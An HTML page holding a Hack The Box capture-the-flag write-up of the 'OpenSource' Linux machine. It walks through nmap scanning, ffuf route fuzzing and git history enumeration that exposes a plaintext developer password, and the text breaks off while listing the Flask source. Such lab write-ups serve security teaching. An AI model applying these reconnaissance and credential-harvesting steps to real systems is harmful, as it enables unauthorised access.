@@ -1,0 +1,534 @@
+<!doctype html><html lang="es"><head><title>OpenSource | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation"><meta itemprop="description" content="Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation"><meta name="twitter:card" content="Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation"><meta property="og:description" content="Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/OpenSource/OpenSource.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/OpenSource/OpenSource.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/OpenSource/OpenSource.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="OpenSource"><meta property="twitter:title" content="OpenSource"><meta property="og:title" content="OpenSource"><meta property="og:url" content="https://7rocky.github.io/en/htb/opensource/"><meta itemprop="keywords" content="git,docker,cronjob,port-forwarding,password-reuse,static-code-analysis,rce,directory-path-traversal,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/opensource/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb7" role="main"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label="aside" class="instapaper_ignoref b helvetica tracked">HTB</aside><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/opensource/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/opensource/&text=OpenSource" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/opensource/&title=OpenSource" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">OpenSource</h1><time class="f6 mv4 dib tracked" datetime="2022-10-08T00:00:00+01:00">08 / 10 / 2022</time></header><div class="htb-image"><img alt="OpenSource" src="/images/HTB/OpenSource/OpenSource.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/port-forwarding" title="Port forwarding">Port forwarding</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/static-code-analysis" title="Static Code Analysis">Static Code Analysis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem"><p class="f5 b mb3">Contents of this write-up</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#git-enumeration">Git enumeration</a></li><li><a href="#static-source-code-analysis">Static source code analysis</a></li><li><a href="#access-to-console">Access to console</a></li><li><a href="#container-enumeration">Container enumeration</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Easy</li><li><strong>IP Address</strong>: 10.10.11.164</li><li><strong>Release</strong>: 21 / 05 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.164 -p 22,80
+Nmap scan report for 10.10.11.164
+Host is up (0.052s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
+|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
+|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
+80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.1.2 Python/3.10.3
+|     Date:
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 5316
+|     Connection: close
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="UTF-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+|     &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;
+|     &lt;script src="/static/vendor/jquery/jquery-3.4.1.min.js"&gt;&lt;/script&gt;
+|     &lt;script src="/static/vendor/popper/popper.min.js"&gt;&lt;/script&gt;
+|     &lt;script src="/static/vendor/bootstrap/js/bootstrap.min.js"&gt;&lt;/script&gt;
+|     &lt;script src="/static/js/ie10-viewport-bug-workaround.js"&gt;&lt;/script&gt;
+|     &lt;link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/&gt;
+|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/&gt;
+|     &lt;link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/&gt;
+|     &lt;link rel=
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.1.2 Python/3.10.3
+|     Date:
+|     Content-Type: text/html; charset=utf-8
+|     Allow: GET, OPTIONS, HEAD
+|     Content-Length: 0
+|     Connection: close
+|   RTSPRequest:
+|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+|     "http://www.w3.org/TR/html4/strict.dtd"&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;  
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+|_http-title: upcloud - Upload files for Free!
+3000/tcp filtered ppp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 96.61 seconds
+</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open. Port 3000 is filtered.</p><h2 id="web-enumeration">Web enumeration</h2><p>If we go to <code>http://10.10.11.164</code>, we will see a page like this:</p><p><img src="/images/HTB/OpenSource/OpenSource-index.png" alt="OpenSource index"></p><p>Scrolling through the page, we can download the source code for part of the web application:</p><p><img src="/images/HTB/OpenSource/OpenSource-download.png" alt="OpenSource download"></p><p>This web application is shown in <code>/upcloud</code>:</p><p><img src="/images/HTB/OpenSource/OpenSource-upload.png" alt="OpenSource upcloud"></p><p>First of all, let&rsquo;s apply some fuzzing to enumerate more routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.164/FUZZ
+<span class="code-dark-green">download                [Status: 200, Size: 2489147, Words: 9473, Lines: 9803, Duration: 155ms]</span>  
+<span class="code-dark-green">console                 [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 45ms]
+</code></pre></div><p>There is <code>/console</code>, which is really interesting if we had the PIN, but we don&rsquo;t:</p><p><img src="/images/HTB/OpenSource/OpenSource-console.png" alt="OpenSource console"></p><p>There are ways to compute the PIN if we have access to some specific files of the server (more information <a href="https://www.daehee.com/werkzeug-console-pin-exploit/">here</a>).</p><h2 id="git-enumeration">Git enumeration</h2><p>So, let&rsquo;s analyze the given source code. First of all, we have these files and directories:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span> -a -L 1
+.
+├── .git
+├── Dockerfile
+├── app
+├── build-docker.sh
+├── config
+└── source.zip
+
+3 directories, 3 files  
+</code></pre></div><p>As we have a <code>.git</code> directory, we have downloaded a Git repository, so there might be some sensitive information in old commits:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> log
+<span class="code-dark-yellow">commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (<span class="code-cyan">HEAD -&gt;</span> <span class="code-green">public</span>)</span>  
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:55:55 2022 +0200
+
+    clean up dockerfile for production use
+
+<span class="code-dark-yellow">commit ee9d9f1ef9156c787d53074493e39ae364cd1e05</span>
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:45:17 2022 +0200
+
+    initial
+
+<span class="code-cyan">$</span> <span class="code-dark-green">git</span> diff 2c67 ee9d
+<span class="code-white">diff --git a/Dockerfile b/Dockerfile</span>
+<span class="code-white">index 5b0553c..76c7768 100644</span>
+<span class="code-white">--- a/Dockerfile</span>
+<span class="code-white">+++ b/Dockerfile</span>
+<span class="code-dark-cyan">@@ -29,6 +29,7 @@</span> ENV PYTHONDONTWRITEBYTECODE=1
+
+ # Set mode
+ ENV MODE="PRODUCTION"
+<span class="code-dark-green">+# ENV FLASK_DEBUG=1</span>
+
+ # Run supervisord
+ CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
+</code></pre></div><p>Nothing useful at all. Let&rsquo;s see if we have more branches:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> branch  
+  dev
+* <span class="code-dark-green">public
+</code></pre></div><p>There&rsquo;s a branch called <code>dev</code>, let&rsquo;s switch to that and enumerate old commits again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> checkout dev
+Cambiado a rama 'dev'
+
+<span class="code-cyan">$</span> <span class="code-dark-green">git</span> log
+<span class="code-dark-yellow">commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (<span class="code-cyan">HEAD -&gt;</span> <span class="code-green">dev</span>)</span>  
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:47:24 2022 +0200
+
+    ease testing
+
+<span class="code-dark-yellow">commit be4da71987bbbc8fae7c961fb2de01ebd0be1997</span>
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:46:54 2022 +0200
+
+    added gitignore
+
+<span class="code-dark-yellow">commit a76f8f75f7a4a12b706b0cf9c983796fa1985820</span>
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:46:16 2022 +0200
+
+    updated
+
+<span class="code-dark-yellow">commit ee9d9f1ef9156c787d53074493e39ae364cd1e05</span>
+Author: gituser &lt;gituser@local&gt;
+Date:   Thu Apr 28 13:45:17 2022 +0200
+
+    initial
+</code></pre></div><p>It looks better. Let&rsquo;s see the differences:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> diff a76f ee9d
+<span class="code-white">diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json</span>
+<span class="code-white">deleted file mode 100644</span>
+<span class="code-white">index 5975e3f..0000000</span>
+<span class="code-white">--- a/app/.vscode/settings.json</span>
+<span class="code-white">+++ /dev/null</span>
+<span class="code-dark-cyan">@@ -1,5 +0,0 @@</span>
+<span class="code-dark-red">-{</span>
+<span class="code-dark-red">-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",</span>  
+<span class="code-dark-red">-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",</span>
+<span class="code-dark-red">-  "http.proxyStrictSSL": false</span>
+<span class="code-dark-red">-}</span>
+<span class="code-white">diff --git a/app/app/views.py b/app/app/views.py</span>
+<span class="code-white">index 0f3cc37..f2744c6 100644</span>
+<span class="code-white">--- a/app/app/views.py</span>
+<span class="code-white">+++ b/app/app/views.py</span>
+<span class="code-dark-cyan">@@ -6,17 +6,7 @@</span> from flask import render_template, request, send_file
+ from app import app
+
+
+<span class="code-dark-red">-@app.route('/')</span>
+<span class="code-dark-red">-def index():</span>
+<span class="code-dark-red">-    return render_template('index.html')</span>
+<span class="code-dark-red">-</span>
+<span class="code-dark-red">-</span>
+<span class="code-dark-red">-@app.route('/download')</span>
+<span class="code-dark-red">-def download():</span>
+<span class="code-dark-red">-    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))</span>
+<span class="code-dark-red">-</span>
+<span class="code-dark-red">-</span>
+<span class="code-dark-red">-@app.route('/upcloud', methods=['GET', 'POST'])</span>
+<span class="code-dark-green">+@app.route('/', methods=['GET', 'POST'])</span>
+ def upload_file():
+     if request.method == 'POST':
+         f = request.files['file']
+<span class="code-dark-cyan">@@ -30,4 +20,4 @@</span> def upload_file():
+ @app.route('/uploads/&lt;path:path&gt;')
+ def send_report(path):
+     path = get_file_name(path)
+<span class="code-dark-red">-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))</span>
+<span class="code-dark-green">+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))</span>
+\ No newline at end of file
+</code></pre></div><p>And there we can see a clear text password for user <code>dev01</code>: <code>Soulless_Developer#2022</code>. These credentials are used for an HTTP proxy on port 5187, but this port is closed according to <code>nmap</code>.</p><h2 id="static-source-code-analysis">Static source code analysis</h2><p>Let&rsquo;s continue by taking a look to the source files:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">os</span>
+
+<span class="mtk5">from</span> <span class="mtk8 mtku">flask</span> <span class="mtk5">import</span> <span class="mtk8 mtku">Flask</span>
+
+<span class="mtk1">app</span> <span class="mtk5">=</span> <span class="mtk8 mtku">Flask</span><span class="mtk1">(</span><span class="mtk1">__name__</span><span class="mtk1">)</span>
+
+<span class="mtk5">if</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">environ</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'MODE'</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk4">'PRODUCTION'</span><span class="mtk1">:</span>
+    <span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk1">config</span><span class="mtk1">.</span><span class="mtk8">from_object</span><span class="mtk1">(</span><span class="mtk4">'app.configuration.ProductionConfig'</span><span class="mtk1">)</span>
+<span class="mtk5">else</span><span class="mtk1">:</span>
+    <span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk1">config</span><span class="mtk1">.</span><span class="mtk8">from_object</span><span class="mtk1">(</span><span class="mtk4">'app.configuration.DevelopmentConfig'</span><span class="mtk1">)</span>  
+
+<span class="mtk5">from</span> <span class="mtk8 mtku">app</span> <span class="mtk5">import</span> <span class="mtk8 mtku">views</span>
+</code></pre></div><p>It uses Flask, which is a Python web framework. The file called <code>views.py</code> contains all the available routes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">os</span>
+
+<span class="mtk5">from</span> <span class="mtk8 mtku">app</span><span class="mtk1">.</span><span class="mtk8 mtku">utils</span> <span class="mtk5">import</span> <span class="mtk8">get_file_name</span>
+<span class="mtk5">from</span> <span class="mtk8 mtku">flask</span> <span class="mtk5">import</span> <span class="mtk8">render_template</span><span class="mtk1">,</span> <span class="mtk1">request</span><span class="mtk1">,</span> <span class="mtk8">send_file</span>
+
+<span class="mtk5">from</span> <span class="mtk8 mtku">app</span> <span class="mtk5">import</span> <span class="mtk1">app</span>
+
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>
+<span class="mtk7 mtki">def</span> <span class="mtk8">index</span><span class="mtk1">():</span>
+    <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'index.html'</span><span class="mtk1">)</span>
+
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/download'</span><span class="mtk1">)</span>
+<span class="mtk7 mtki">def</span> <span class="mtk8">download</span><span class="mtk1">():</span>
+    <span class="mtk5">return</span> <span class="mtk8">send_file</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">getcwd</span><span class="mtk1">(),</span> <span class="mtk4">"app"</span><span class="mtk1">,</span> <span class="mtk4">"static"</span><span class="mtk1">,</span> <span class="mtk4">"source.zip"</span><span class="mtk1">))</span>
+
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/upcloud'</span><span class="mtk1">,</span> <span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">,</span> <span class="mtk4">'POST'</span><span class="mtk1">])</span>
+<span class="mtk7 mtki">def</span> <span class="mtk8">upload_file</span><span class="mtk1">():</span>
+    <span class="mtk5">if</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span> <span class="mtk5">==</span> <span class="mtk4">'POST'</span><span class="mtk1">:</span>
